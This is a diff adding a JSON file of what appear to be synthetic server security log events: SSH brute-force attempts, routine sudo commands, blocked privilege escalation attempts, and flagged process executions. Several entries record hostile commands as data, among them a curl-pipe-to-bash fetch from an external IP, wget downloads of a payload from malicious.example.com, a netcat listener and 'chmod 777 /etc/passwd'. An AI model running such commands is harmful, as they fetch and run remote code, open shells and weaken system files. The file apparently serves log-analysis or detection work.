@@ -1,0 +1,702 @@
+[
+  {
+    "timestamp": "2026-05-26T21:32:59",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "89.248.165.64",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-26T21:57:14",
+    "event_type": "ssh_failed_login",
+    "user": "test",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-26T22:12:38",
+    "event_type": "ssh_successful_login",
+    "user": "damon",
+    "source_ip": "192.168.1.15",
+    "port": 22,
+    "status": "success",
+    "severity": "info"
+  },
+  {
+    "timestamp": "2026-05-26T23:55:16",
+    "event_type": "ssh_failed_login",
+    "user": "oracle",
+    "source_ip": "185.220.101.45",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T01:20:31",
+    "event_type": "ssh_failed_login",
+    "user": "oracle",
+    "source_ip": "198.20.69.74",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T03:00:52",
+    "event_type": "ssh_successful_login",
+    "user": "admin",
+    "source_ip": "192.168.1.15",
+    "port": 22,
+    "status": "success",
+    "severity": "info"
+  },
+  {
+    "timestamp": "2026-05-27T03:25:30",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "185.220.101.45",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T03:30:20",
+    "event_type": "sudo",
+    "user": "damon",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/apt-get update",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T05:07:06",
+    "event_type": "ssh_failed_login",
+    "user": "oracle",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T05:10:25",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.22",
+    "command": "/usr/bin/apt-get update",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T06:16:14",
+    "event_type": "ssh_failed_login",
+    "user": "oracle",
+    "source_ip": "185.220.101.45",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T06:29:20",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "89.248.165.64",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T06:35:18",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/tail -f /var/log/syslog",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T07:20:28",
+    "event_type": "ssh_successful_login",
+    "user": "damon",
+    "source_ip": "192.168.1.15",
+    "port": 22,
+    "status": "success",
+    "severity": "info"
+  },
+  {
+    "timestamp": "2026-05-27T07:22:25",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "89.248.165.64",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T07:22:43",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "89.248.165.64",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T08:26:16",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/tail -f /var/log/syslog",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T09:41:09",
+    "event_type": "ssh_successful_login",
+    "user": "damon",
+    "source_ip": "192.168.1.10",
+    "port": 22,
+    "status": "success",
+    "severity": "info"
+  },
+  {
+    "timestamp": "2026-05-27T10:27:21",
+    "event_type": "ssh_failed_login",
+    "user": "test",
+    "source_ip": "185.220.101.45",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T10:57:08",
+    "event_type": "ssh_failed_login",
+    "user": "test",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T10:57:42",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "89.248.165.64",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T11:20:19",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T12:01:25",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/apt-get update",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T12:26:34",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/apt-get update",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T12:26:35",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "198.20.69.74",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T12:35:57",
+    "event_type": "ssh_successful_login",
+    "user": "damon",
+    "source_ip": "192.168.1.10",
+    "port": 22,
+    "status": "success",
+    "severity": "info"
+  },
+  {
+    "timestamp": "2026-05-27T13:02:31",
+    "event_type": "ssh_successful_login",
+    "user": "damon",
+    "source_ip": "192.168.1.15",
+    "port": 22,
+    "status": "success",
+    "severity": "info"
+  },
+  {
+    "timestamp": "2026-05-27T13:31:57",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T13:32:26",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "198.20.69.74",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T13:32:37",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "185.220.101.45",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T14:02:42",
+    "event_type": "sudo",
+    "user": "damon",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/systemctl restart nginx",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T14:09:49",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/systemctl restart nginx",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T14:24:44",
+    "event_type": "sudo",
+    "user": "damon",
+    "source_ip": "192.168.1.10",
+    "command": "/usr/bin/apt-get update",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T15:00:27",
+    "event_type": "process_execution",
+    "user": "guest",
+    "source_ip": "198.20.69.74",
+    "process": "curl -s http://45.33.32.156/shell.sh | bash",
+    "status": "detected",
+    "severity": "critical",
+    "note": "suspicious process execution pattern detected"
+  },
+  {
+    "timestamp": "2026-05-27T15:14:58",
+    "event_type": "process_execution",
+    "user": "oracle",
+    "source_ip": "198.20.69.74",
+    "process": "wget http://malicious.example.com/payload",
+    "status": "detected",
+    "severity": "critical",
+    "note": "suspicious process execution pattern detected"
+  },
+  {
+    "timestamp": "2026-05-27T15:46:55",
+    "event_type": "ssh_successful_login",
+    "user": "damon",
+    "source_ip": "192.168.1.10",
+    "port": 22,
+    "status": "success",
+    "severity": "info"
+  },
+  {
+    "timestamp": "2026-05-27T15:53:36",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T15:59:51",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "198.20.69.74",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T16:08:40",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.10",
+    "command": "/usr/bin/tail -f /var/log/syslog",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T16:28:43",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "198.20.69.74",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T16:37:07",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/systemctl restart nginx",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T17:01:19",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T17:30:34",
+    "event_type": "privilege_escalation",
+    "user": "test",
+    "source_ip": "89.248.165.64",
+    "command": "sudo /bin/bash",
+    "status": "blocked",
+    "severity": "critical",
+    "note": "unauthorized privilege escalation attempt blocked"
+  },
+  {
+    "timestamp": "2026-05-27T18:02:07",
+    "event_type": "privilege_escalation",
+    "user": "guest",
+    "source_ip": "89.248.165.64",
+    "command": "sudo su -",
+    "status": "blocked",
+    "severity": "critical",
+    "note": "unauthorized privilege escalation attempt blocked"
+  },
+  {
+    "timestamp": "2026-05-27T18:11:30",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "89.248.165.64",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T18:45:34",
+    "event_type": "ssh_successful_login",
+    "user": "admin",
+    "source_ip": "192.168.1.10",
+    "port": 22,
+    "status": "success",
+    "severity": "info"
+  },
+  {
+    "timestamp": "2026-05-27T19:04:11",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "89.248.165.64",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T19:16:47",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:16:50",
+    "event_type": "ssh_failed_login",
+    "user": "test",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:16:53",
+    "event_type": "ssh_failed_login",
+    "user": "oracle",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:16:56",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:16:59",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:02",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:05",
+    "event_type": "ssh_failed_login",
+    "user": "test",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:08",
+    "event_type": "ssh_failed_login",
+    "user": "oracle",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:11",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:14",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:17",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:20",
+    "event_type": "ssh_failed_login",
+    "user": "test",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:23",
+    "event_type": "ssh_failed_login",
+    "user": "oracle",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:17:26",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "critical",
+    "note": "rapid sequential login attempts \u2014 possible brute force"
+  },
+  {
+    "timestamp": "2026-05-27T19:18:01",
+    "event_type": "sudo",
+    "user": "admin",
+    "source_ip": "192.168.1.15",
+    "command": "/usr/bin/tail -f /var/log/syslog",
+    "status": "success",
+    "severity": "low"
+  },
+  {
+    "timestamp": "2026-05-27T19:28:16",
+    "event_type": "process_execution",
+    "user": "oracle",
+    "source_ip": "89.248.165.64",
+    "process": "wget http://malicious.example.com/payload",
+    "status": "detected",
+    "severity": "critical",
+    "note": "suspicious process execution pattern detected"
+  },
+  {
+    "timestamp": "2026-05-27T19:36:46",
+    "event_type": "ssh_failed_login",
+    "user": "guest",
+    "source_ip": "198.20.69.74",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T19:36:54",
+    "event_type": "process_execution",
+    "user": "oracle",
+    "source_ip": "45.33.32.156",
+    "process": "wget http://malicious.example.com/payload",
+    "status": "detected",
+    "severity": "critical",
+    "note": "suspicious process execution pattern detected"
+  },
+  {
+    "timestamp": "2026-05-27T20:02:32",
+    "event_type": "process_execution",
+    "user": "guest",
+    "source_ip": "198.20.69.74",
+    "process": "nc -lvp 4444",
+    "status": "detected",
+    "severity": "critical",
+    "note": "suspicious process execution pattern detected"
+  },
+  {
+    "timestamp": "2026-05-27T20:13:19",
+    "event_type": "privilege_escalation",
+    "user": "oracle",
+    "source_ip": "89.248.165.64",
+    "command": "sudo su -",
+    "status": "blocked",
+    "severity": "critical",
+    "note": "unauthorized privilege escalation attempt blocked"
+  },
+  {
+    "timestamp": "2026-05-27T20:21:21",
+    "event_type": "privilege_escalation",
+    "user": "test",
+    "source_ip": "185.220.101.45",
+    "command": "chmod 777 /etc/passwd",
+    "status": "blocked",
+    "severity": "critical",
+    "note": "unauthorized privilege escalation attempt blocked"
+  },
+  {
+    "timestamp": "2026-05-27T20:26:05",
+    "event_type": "ssh_failed_login",
+    "user": "postgres",
+    "source_ip": "45.33.32.156",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T20:36:42",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "198.20.69.74",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  },
+  {
+    "timestamp": "2026-05-27T20:42:43",
+    "event_type": "process_execution",
+    "user": "pi",
+    "source_ip": "185.220.101.45",
+    "process": "wget http://malicious.example.com/payload",
+    "status": "detected",
+    "severity": "critical",
+    "note": "suspicious process execution pattern detected"
+  },
+  {
+    "timestamp": "2026-05-27T21:07:27",
+    "event_type": "ssh_failed_login",
+    "user": "pi",
+    "source_ip": "185.220.101.45",
+    "port": 22,
+    "status": "failed",
+    "severity": "high",
+    "note": "repeated failed authentication from external IP"
+  }
+]
